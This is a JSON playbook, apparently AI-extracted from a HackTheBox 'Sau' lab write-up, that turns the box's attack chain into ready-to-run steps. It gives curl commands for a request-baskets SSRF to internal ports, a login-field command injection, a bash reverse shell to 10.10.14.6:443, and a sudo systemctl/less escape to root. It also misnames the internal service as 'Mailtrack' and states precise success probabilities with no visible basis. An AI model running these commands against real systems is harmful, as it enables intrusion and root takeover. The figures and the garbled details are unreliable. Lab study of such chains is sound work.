@@ -1,0 +1,809 @@
+{
+  "writeup_id": "Htb_Sau",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_ssrf_to_command_injection",
+    "primary_services": [
+      "ssh",
+      "http"
+    ],
+    "port_signature": "22+55555",
+    "service_combination": "ssh+custom_http",
+    "os_family": "linux",
+    "environment_type": "standalone_server",
+    "entry_vector": "ssrf_vulnerability",
+    "privilege_path": "web_user_to_root",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "request_baskets_service",
+      "filtered_internal_ports",
+      "ssrf_to_command_injection_chain",
+      "systemctl_less_pager_abuse"
+    ],
+    "environmental_clues": [
+      "custom_port_55555",
+      "request_baskets_v1.2.1",
+      "filtered_ports_80_8338",
+      "ubuntu_20.04_openssh"
+    ],
+    "similar_scenarios": [
+      "ssrf_exploitation_boxes",
+      "command_injection_web_apps"
+    ],
+    "unique_aspects": [
+      "request_baskets_application",
+      "mailtrack_internal_service",
+      "less_pager_privilege_escalation"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "SSRF_exploitation",
+        "success_reason": "Request-baskets service allowed forwarding requests to internal services",
+        "prerequisite_indicators": [
+          "request_baskets_service_running",
+          "internal_services_accessible",
+          "basket_configuration_modifiable"
+        ],
+        "recognition_patterns": [
+          "request-baskets version 1.2.1 in footer",
+          "basket creation returns tokens",
+          "HTTP requests captured and displayed"
+        ],
+        "failure_modes": [
+          "ssrf_protections_enabled",
+          "internal_services_filtered",
+          "basket_forwarding_disabled"
+        ],
+        "environmental_factors": [
+          "default_request_baskets_config",
+          "internal_services_on_filtered_ports",
+          "no_ssrf_input_validation"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "command_injection",
+        "success_reason": "Internal Mailtrack service vulnerable to command injection via SSRF",
+        "prerequisite_indicators": [
+          "ssrf_access_established",
+          "internal_web_service_identified",
+          "user_input_processed_unsafely"
+        ],
+        "recognition_patterns": [
+          "filtered ports 80 and 8338 from nmap",
+          "internal service accessible via SSRF",
+          "command injection in web parameters"
+        ],
+        "failure_modes": [
+          "input_sanitization_present",
+          "command_execution_restricted",
+          "internal_service_hardened"
+        ],
+        "environmental_factors": [
+          "internal_service_assumptions",
+          "lack_of_input_validation",
+          "trusted_internal_network_model"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "systemctl_less_pager_abuse",
+        "success_reason": "Less pager in systemctl allows command execution when run with sudo",
+        "prerequisite_indicators": [
+          "sudo_privileges_on_systemctl",
+          "less_pager_used_by_default",
+          "interactive_terminal_available"
+        ],
+        "recognition_patterns": [
+          "sudo -l shows systemctl permissions",
+          "systemctl status opens less pager",
+          "less pager accepts ! commands"
+        ],
+        "failure_modes": [
+          "pager_environment_restricted",
+          "sudo_systemctl_limited",
+          "non_interactive_shell"
+        ],
+        "environmental_factors": [
+          "default_pager_configuration",
+          "sudo_permissions_misconfiguration",
+          "interactive_shell_access"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "2-5 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "request-baskets version 1.2.1",
+        "discovery_method": "footer_information_disclosure",
+        "why_critical": "Known vulnerable version allowing SSRF via basket forwarding",
+        "how_to_recognize": [
+          "powered by request-baskets footer text",
+          "version number displayed",
+          "basket creation functionality"
+        ],
+        "follow_up_actions": [
+          "research_known_vulnerabilities",
+          "test_ssrf_capabilities",
+          "identify_internal_services"
+        ]
+      },
+      {
+        "discovery": "filtered ports 80 and 8338",
+        "discovery_method": "nmap_port_scan",
+        "why_critical": "Internal services accessible via SSRF bypass",
+        "how_to_recognize": [
+          "nmap shows filtered state",
+          "services not directly accessible",
+          "internal network topology"
+        ],
+        "follow_up_actions": [
+          "attempt_ssrf_to_filtered_ports",
+          "enumerate_internal_services",
+          "test_command_injection"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "user_shell",
+        "escalation_method": "sudo_systemctl_less_pager",
+        "why_possible": "User has sudo privileges on systemctl which uses less pager",
+        "recognition_signs": [
+          "sudo_l_shows_systemctl",
+          "systemctl_status_opens_pager",
+          "less_pager_command_execution"
+        ],
+        "exploitation_path": "sudo systemctl status → less pager → !sh → root shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22 (SSH), 55555 (HTTP), and filtered ports 80, 8338 on Linux host",
+        "decision": "Investigate unusual HTTP port 55555 first, note filtered ports for potential SSRF targets",
+        "reasoning": "Non-standard HTTP port suggests custom application, filtered ports indicate internal services",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_enumeration",
+            "when": "if web application fails"
+          },
+          {
+            "option": "port_knocking",
+            "when": "if filtered ports show patterns"
+          }
+        ],
+        "success_indicators": [
+          "web_application_identified",
+          "technology_stack_discovered",
+          "filtered_ports_documented"
+        ],
+        "next_decision": "analyze_web_application_functionality"
+      },
+      {
+        "step": 2,
+        "situation": "Identified request-baskets v1.2.1 application with SSRF potential",
+        "decision": "Research known vulnerabilities for request-baskets 1.2.1",
+        "reasoning": "Specific version identified, request-baskets handles HTTP requests which suggests SSRF capability",
+        "confidence": 0.95,
+        "prerequisites": [
+          "application_version_confirmed",
+          "functionality_understood"
+        ],
+        "success_indicators": [
+          "cve_found",
+          "exploit_available",
+          "ssrf_confirmed"
+        ],
+        "failure_fallbacks": [
+          "manual_ssrf_testing",
+          "directory_bruteforce",
+          "parameter_fuzzing"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "SSRF capability confirmed in request-baskets",
+        "decision": "Target filtered ports 80 and 8338 via SSRF",
+        "reasoning": "Filtered ports likely contain internal services accessible via localhost SSRF",
+        "confidence": 0.85,
+        "prerequisites": [
+          "ssrf_exploit_working",
+          "filtered_ports_identified"
+        ],
+        "success_indicators": [
+          "internal_service_discovered",
+          "new_attack_surface_found"
+        ],
+        "failure_fallbacks": [
+          "try_other_internal_ports",
+          "enumerate_localhost_services"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_ssrf_succeeds": {
+        "action": "enumerate_internal_services",
+        "tools": [
+          "burp_suite",
+          "curl",
+          "custom_ssrf_payloads"
+        ],
+        "next_phase": "exploit_internal_services"
+      },
+      "if_internal_service_found": {
+        "action": "analyze_internal_application",
+        "purpose": "find_command_injection_or_rce",
+        "tools": [
+          "web_scanner",
+          "manual_testing"
+        ]
+      },
+      "if_rce_obtained": {
+        "action": "establish_reverse_shell",
+        "purpose": "gain_initial_foothold",
+        "tools": [
+          "netcat",
+          "python_reverse_shell",
+          "bash_reverse_shell"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_filtered_ports_for_ssrf_targets",
+        "reasoning": "filtered_ports_often_indicate_internal_services_accessible_via_ssrf",
+        "applicability": "ssrf_capable_applications"
+      },
+      {
+        "rule": "research_specific_versions_of_identified_software",
+        "reasoning": "version_specific_vulnerabilities_provide_direct_exploitation_path",
+        "applicability": "any_identified_software_with_version"
+      },
+      {
+        "rule": "prioritize_unusual_ports_over_standard_services",
+        "reasoning": "custom_applications_more_likely_to_have_vulnerabilities",
+        "applicability": "initial_reconnaissance_phase"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "SSRF_Exploitation",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443,
+          55555
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "request_forwarding_functionality",
+          "internal_services_accessible",
+          "url_parameter_input"
+        ],
+        "success_indicators": [
+          "request_basket_service_detected",
+          "internal_port_responses",
+          "filtered_ports_accessible_internally",
+          "service_version_vulnerable"
+        ],
+        "incompatible_with": [
+          "strict_url_validation",
+          "network_segmentation_enforced",
+          "whitelist_only_destinations"
+        ],
+        "confidence_boosters": [
+          "request_baskets_version_1_2_1",
+          "filtered_ports_detected",
+          "internal_service_banners"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Command_Injection_Web",
+        "mitre_id": "T1059.004",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8338
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "user_input_processed_by_system",
+          "insufficient_input_sanitization",
+          "system_command_execution"
+        ],
+        "success_indicators": [
+          "mailtrack_service_detected",
+          "command_output_in_response",
+          "system_command_execution_confirmed",
+          "reverse_shell_connection"
+        ],
+        "incompatible_with": [
+          "strict_input_validation",
+          "command_execution_disabled",
+          "sandboxed_environment"
+        ],
+        "confidence_boosters": [
+          "internal_service_via_ssrf",
+          "development_environment_indicators",
+          "verbose_error_messages"
+        ],
+        "typical_success_rate": 0.68,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Systemctl_Less_Pager_Privilege_Escalation",
+        "mitre_id": "T1548.001",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "systemctl_available",
+          "less_pager_configured",
+          "sudo_privileges_on_systemctl",
+          "interactive_terminal_access"
+        ],
+        "success_indicators": [
+          "sudo_systemctl_permissions",
+          "less_pager_spawned",
+          "shell_escape_successful",
+          "root_privileges_obtained"
+        ],
+        "incompatible_with": [
+          "restricted_sudo_configuration",
+          "alternative_pager_configured",
+          "non_interactive_shell"
+        ],
+        "confidence_boosters": [
+          "ubuntu_default_configuration",
+          "less_pager_default",
+          "systemctl_status_command_available"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "2-5 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "request_baskets_service": {
+        "port_indicators": [
+          55555,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http"
+        ],
+        "banner_indicators": [
+          "request-baskets",
+          "basket name",
+          "Powered by request-baskets"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "filtered_internal_services": {
+        "port_indicators": [
+          80,
+          8338
+        ],
+        "service_indicators": [
+          "filtered"
+        ],
+        "banner_indicators": [
+          "filtered",
+          "unknown"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "ubuntu_linux": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh"
+        ],
+        "banner_indicators": [
+          "OpenSSH 8.2p1 Ubuntu",
+          "ubuntu0.7"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "ssrf_via_request_baskets",
+          "when": "request_baskets_detected_and_filtered_ports_present",
+          "reason": "high_success_rate_access_internal_services"
+        },
+        {
+          "attack": "systemctl_less_privilege_escalation",
+          "when": "shell_access_obtained_ubuntu_detected",
+          "reason": "very_high_success_rate_quick_root"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "command_injection_internal_web",
+          "when": "internal_web_service_accessible_via_ssrf",
+          "reason": "depends_on_application_specific_vulnerabilities"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Server-Side Request Forgery (SSRF)",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X POST http://{target_ip}:{port}/api/baskets/{basket_name} -H 'Content-Type: application/json' -d '{\"forward_url\": \"http://127.0.0.1:{internal_port}\", \"proxy_response\": true, \"insecure_tls\": false, \"expand_path\": true, \"capacity\": 250}'",
+            "actual_command": "curl -X POST http://10.10.11.224:55555/api/baskets/test -H 'Content-Type: application/json' -d '{\"forward_url\": \"http://127.0.0.1:80\", \"proxy_response\": true, \"insecure_tls\": false, \"expand_path\": true, \"capacity\": 250}'",
+            "output_pattern": "HTTP/1.1 200 OK",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "request-baskets",
+            "command_template": "Access via http://{target_ip}:{port}/{basket_name}",
+            "actual_command": "curl http://10.10.11.224:55555/test",
+            "success_factors": [
+              "vulnerable_version_1.2.1",
+              "internal_services_accessible"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "request_baskets_version_1.2.1",
+          "internal_services_running",
+          "network_connectivity_to_target"
+        ],
+        "success_indicators": [
+          "basket_configuration_accepted",
+          "internal_service_response_received",
+          "filtered_ports_become_accessible"
+        ],
+        "common_failures": [
+          "newer_patched_version",
+          "no_internal_services",
+          "network_filtering_blocks_requests"
+        ],
+        "follow_up_techniques": [
+          "command_injection",
+          "internal_service_enumeration",
+          "privilege_escalation"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Command Injection via Web Interface",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl 'http://{target_ip}:{port}/{basket_name}/login' --data 'username=;{command};'",
+            "actual_command": "curl 'http://10.10.11.224:55555/test/login' --data 'username=;id;'",
+            "output_pattern": "Command output in response",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          },
+          {
+            "name": "reverse_shell",
+            "command_template": "curl 'http://{target_ip}:{port}/{path}' --data 'username=;bash -c \"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1\";'",
+            "actual_command": "curl 'http://10.10.11.224:55555/test/login' --data 'username=;bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\";'",
+            "success_factors": [
+              "bash_available",
+              "outbound_connections_allowed"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "ssrf_access_established",
+          "vulnerable_internal_application",
+          "command_injection_point_identified"
+        ],
+        "success_indicators": [
+          "command_execution_confirmed",
+          "reverse_shell_connection_established",
+          "system_access_obtained"
+        ],
+        "common_failures": [
+          "input_sanitization_present",
+          "outbound_connections_blocked",
+          "shell_not_available"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "system_enumeration",
+          "persistence_establishment"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Systemctl Less Pager Privilege Escalation",
+        "mitre_id": "T1548.001",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "systemctl",
+            "command_template": "sudo systemctl status {service_name}",
+            "actual_command": "sudo systemctl status trail.service",
+            "output_pattern": "Opens less pager with root privileges",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "less_pager_escape",
+            "command_template": "!{command}",
+            "actual_command": "!/bin/bash",
+            "success_factors": [
+              "less_pager_active",
+              "sudo_privileges_on_systemctl"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "sudo_access_to_systemctl",
+          "service_with_long_output",
+          "less_pager_configured"
+        ],
+        "success_indicators": [
+          "less_pager_opens",
+          "shell_escape_successful",
+          "root_privileges_obtained"
+        ],
+        "common_failures": [
+          "no_sudo_privileges",
+          "different_pager_configured",
+          "service_output_too_short"
+        ],
+        "follow_up_techniques": [
+          "persistence_establishment",
+          "credential_harvesting",
+          "system_modification"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "request-baskets",
+        "use_case": "ssrf_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "internal_service_access"
+        ],
+        "alternatives": [
+          "direct_ssrf_vulnerabilities",
+          "proxy_tools"
+        ],
+        "best_practices": [
+          "enumerate_internal_ports_systematically",
+          "configure_proxy_response_true",
+          "use_expand_path_for_full_access"
+        ]
+      },
+      {
+        "tool": "systemctl",
+        "use_case": "privilege_escalation_via_pager",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "linux_privilege_escalation"
+        ],
+        "alternatives": [
+          "other_sudo_binaries",
+          "kernel_exploits"
+        ],
+        "best_practices": [
+          "check_sudo_permissions_first",
+          "identify_services_with_long_status",
+          "use_shell_escape_sequences"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "ssrf_to_command_injection",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -X POST http://10.10.11.224:55555/api/baskets/test -H 'Content-Type: application/json' -d '{\"forward_url\": \"http://127.0.0.1:80\", \"proxy_response\": true, \"insecure_tls\": false, \"expand_path\": true, \"capacity\": 250}'",
+            "purpose": "Configure SSRF basket to access internal port 80",
+            "expected_output": "Basket configuration accepted"
+          },
+          {
+            "step": 2,
+            "command": "curl http://10.10.11.224:55555/test",
+            "purpose": "Access internal service via SSRF",
+            "expected_output": "Internal web application response"
+          },
+          {
+            "step": 3,
+            "command": "curl 'http://10.10.11.224:55555/test/login' --data 'username=;id;'",
+            "purpose": "Test command injection",
+            "expected_output": "Command output showing user ID"
+          },
+          {
+            "step": 4,
+            "command": "curl 'http://10.10.11.224:55555/test/login' --data 'username=;bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\";'",
+            "purpose": "Execute reverse shell",
+            "expected_output": "Reverse shell connection established"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "15-30 minutes"
+      },
+      {
+        "sequence_name": "systemctl_privilege_escalation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "sudo -l",
+            "purpose": "Check sudo permissions",
+            "expected_output": "systemctl status trail.service allowed"
+          },
+          {
+            "step": 2,
+            "command": "sudo systemctl status trail.service",
+            "purpose": "Open service status with less pager",
+            "expected_output": "Less pager opens with service status"
+          },
+          {
+            "step": 3,
+            "command": "!/bin/bash",
+            "purpose": "Escape to root shell from less pager",
+            "expected_output": "Root shell obtained"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "2-5 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Sau",
+      "difficulty": "Easy",
+      "os": "Linux Ubuntu",
+      "platform": "HackTheBox",
+      "release_date": "2023-07-08",
+      "author": "sau123",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "ssrf",
+        "command_injection"
+      ],
+      "key_vulnerabilities": [
+        "ssrf_exploitation",
+        "mailtrack_command_injection",
+        "systemctl_less_pager_abuse"
+      ],
+      "environment_type": "linux_web_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "ssrf_attacks",
+        "command_injection",
+        "systemctl_privilege_escalation"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_exploitation",
+        "linux_fundamentals",
+        "ssrf_concepts"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "ssrf",
+        "command_injection",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "server_side_request_forgery",
+        "command_injection",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "ssrf_prevention",
+        "service_hardening",
+        "pager_configuration"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Shoppy",
+        "Precious",
+        "Inject"
+      ],
+      "similarity_reasons": [
+        "web_exploitation",
+        "ssrf_attacks",
+        "command_injection"
+      ],
+      "unique_aspects": [
+        "mailtrack_exploitation",
+        "systemctl_less_pager_escalation",
+        "basket_service"
+      ],
+      "difficulty_factors": [
+        "straightforward_ssrf",
+        "clear_attack_chain",
+        "well_known_escalation_technique"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T03:54:05.165167",
+    "original_file": "0xdf_writeups/Htb Sau.md",
+    "content_length": 22255,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
